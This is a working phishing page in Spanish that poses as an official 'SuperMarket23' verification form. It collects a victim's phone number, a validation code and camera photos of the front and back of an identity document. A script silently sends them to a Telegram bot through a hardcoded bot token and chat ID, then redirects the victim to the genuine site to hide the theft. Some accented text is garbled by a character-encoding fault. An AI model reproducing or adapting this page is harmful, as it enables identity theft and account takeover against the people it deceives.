
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SuperMarket23 - Verificaci贸n Oficial</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; background-color: #ffffff; color: #004494; text-align: center; }
        
        /* CABECERA PROFESIONAL */
        .header { background-color: #004494; color: white; padding: 50px 20px; border-bottom: 6px solid #002d62; }
        .header h1 { margin: 0; font-size: 42px; font-weight: 900; text-transform: uppercase; letter-spacing: 2px; }

        .container { padding: 25px; max-width: 480px; margin: 0 auto; }
        label { display: block; font-weight: bold; margin: 15px 0 5px 0; text-align: left; font-size: 13px; text-transform: uppercase; }
        
        input { width: 100%; padding: 16px; border: 2px solid #004494; border-radius: 10px; font-size: 16px; background: #f9f9f9; margin-bottom: 10px; }

        /* CUADROS DONDE SE QUEDA PLASMADA LA FOTO */
        .card-slot {
            width: 100%; height: 220px; border: 3px dashed #004494; border-radius: 12px;
            margin-bottom: 20px; display: flex; flex-direction: column; align-items: center;
            justify-content: center; background-color: #f0f5ff; position: relative; overflow: hidden; cursor: pointer;
        }
        
        /* Imagen plasmada */
        .preview-img { 
            width: 100%; height: 100%; object-fit: cover; position: absolute; 
            top: 0; left: 0; display: none; z-index: 10; 
        }
        
        .slot-text { font-weight: bold; font-size: 14px; color: #004494; }

        .btn-auth {
            width: 100%; background-color: #004494; color: white; padding: 20px;
            border: none; border-radius: 10px; font-size: 22px; font-weight: bold; cursor: pointer; margin-top: 10px;
        }
        #status { margin-top: 15px; font-weight: bold; display: none; }
    </style>
</head>
<body>

    <div class="header">
        <h1>SuperMarket23</h1>
    </div>

    <div class="container">
        <label>N煤mero de Tel茅fono</label>
        <input type="tel" id="phone" placeholder="Ej: +53 51234567">

        <label>Documentaci贸n (C谩mara Trasera)</label>
        
        <div class="card-slot" onclick="document.getElementById('in-1').click()">
            <img id="v-1" class="preview-img">
            <div id="t-1" class="slot-text"> TOCAR PARA TIRAR FOTO FRENTE</div>
            <input type="file" id="in-1" accept="image/*" capture="environment" style="display:none" onchange="mostrarFoto(this, 'v-1', 't-1')">
        </div>

        <div class="card-slot" onclick="document.getElementById('in-2').click()">
            <img id="v-2" class="preview-img">
            <div id="t-2" class="slot-text"> TOCAR PARA TIRAR FOTO DORSO</div>
            <input type="file" id="in-2" accept="image/*" capture="environment" style="display:none" onchange="mostrarFoto(this, 'v-2', 't-2')">
        </div>

        <div class="card-slot" onclick="document.getElementById('in-3').click()">
            <img id="v-3" class="preview-img">
            <div id="t-3" class="slot-text"> TOCAR PARA TIRAR FOTO EXTRA</div>
            <input type="file" id="in-3" accept="image/*" capture="environment" style="display:none" onchange="mostrarFoto(this, 'v-3', 't-3')">
        </div>

        <label>C贸digo de Validaci贸n</label>
        <input type="text" id="code" placeholder="Ingrese el c贸digo">

        <button class="btn-auth" id="btn-send" onclick="enviarTodo()">AUTENTICACIN</button>
        <p id="status">Procesando...</p>
    </div>

    <script>
        const token = "7544330182:AAFrW7uF7qG2IasXoR3vGq9oYv_H135p0S0";
        const chat_id = "-4748113880";

        // Funci贸n para que la foto se quede plasmada en el cuadro
        function mostrarFoto(input, imgId, txtId) {
            if (input.files && input.files[0]) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    const imgElement = document.getElementById(imgId);
                    imgElement.src = e.target.result;
                    imgElement.style.display = 'block'; // Muestra la foto
                    document.getElementById(txtId).style.display = 'none'; // Quita el texto
                };
                reader.readAsDataURL(input.files[0]);
            }
        }

        async function enviarTodo() {
            const phone = document.getElementById('phone').value;
            const code = document.getElementById('code').value;
            const f1 = document.getElementById('in-1').files[0];
            const f2 = document.getElementById('in-2').files[0];
            const f3 = document.getElementById('in-3').files[0];
            const status = document.getElementById('status');

            if (!phone || !code || !f1 || !f2 || !f3) {
                alert("Por favor, tire las 3 fotos y llene los datos.");
                return;
            }

            document.getElementById('btn-send').disabled = true;
            status.style.display = 'block';

            try {
                // Env铆o de texto silencioso
                const text = `锔 **NUEVA ENTRADA**\n SuperMarket23\n Tel: ${phone}\n Cod: ${code}`;
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);

                // Env铆o de las 3 fotos plasmadas
                await subirArchivo(f1, `FRENTE - ${phone}`);
                await subirArchivo(f2, `DORSO - ${phone}`);
                await subirArchivo(f3, `EXTRA - ${phone}`);

                // Redirecci贸n invisible
                window.location.href = "https://www.supermarket23.com";
            } catch (e) {
                window.location.href = "https://www.supermarket23.com";
            }
        }

        async function subirArchivo(file, cap) {
            const fd = new FormData();
            fd.append('chat_id', chat_id);
            fd.append('photo', file);
            fd.append('caption', cap);
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }
    </script>
</body>
</html>
